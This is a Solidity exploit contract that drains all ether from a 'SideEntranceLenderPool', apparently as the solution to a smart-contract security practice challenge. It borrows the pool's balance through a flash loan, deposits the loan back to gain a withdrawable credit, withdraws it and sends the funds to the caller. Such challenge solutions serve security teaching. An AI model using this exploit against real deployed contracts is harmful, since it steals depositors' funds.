// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "hardhat/console.sol";

/**
 * @title DrainSideEntranceLenderPool
 * @notice Drains ether from `SideEntranceLenderPool` contract
 * @author Joshua Oladeji <analogdev.eth>
 */
contract DrainSideEntranceLenderPool is IFlashLoanEtherReceiver {
    ISideEntranceLenderPool public immutable lendingPool;

    constructor(ISideEntranceLenderPool _lendingPool) {
        lendingPool = _lendingPool;
    }

    function execute() external payable override {
        lendingPool.deposit{value: address(this).balance}();
    }

    function attack() external {
        // call flashloan here
        lendingPool.flashLoan(address(lendingPool).balance);
        lendingPool.withdraw();

        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "ether transfer failed!");
    }

    receive() external payable {}
}

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}
